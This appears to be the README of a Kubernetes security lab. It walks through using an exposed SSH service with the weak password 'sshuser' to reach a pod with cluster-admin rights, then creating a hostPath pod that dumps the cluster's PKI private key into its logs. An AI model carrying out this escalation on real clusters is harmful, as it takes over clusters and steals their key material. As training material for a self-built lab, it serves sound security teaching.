## SSH to Cluster Admin

This cluster has an exposed SSH service running on port 32001/TCP to a pod in the cluster with cluster-admin rights.  To test this run

- `ansible-playbook ssh-to-create-pods-easy.yml`

Then get a note of the IP address of the Kubernetes cluster with 

```
docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' sshcm-control-plane
```

Connect to your client container

```
docker exec -it client /bin/ash
```

and from there

```
ssh -p 32001 sshuser@[Kubernetes Cluster IP]
```

The password for the sshuser account is `sshuser`

## Compromising the cluster

3. `kubectl get po -n kube-system` will fail (user doesn't have those rights)
4. `kubectl get po` will work and give you a list of pods in the default namespace
At this point there's several ways to achieve the goal, lets go with hostpath
5. Now we need to create a pod that dumps out the PKI private key `kubectl create -f keydumper.yml`
6. and the key should be in the logs `kubectl logs keydumper-pod`
7. profit!
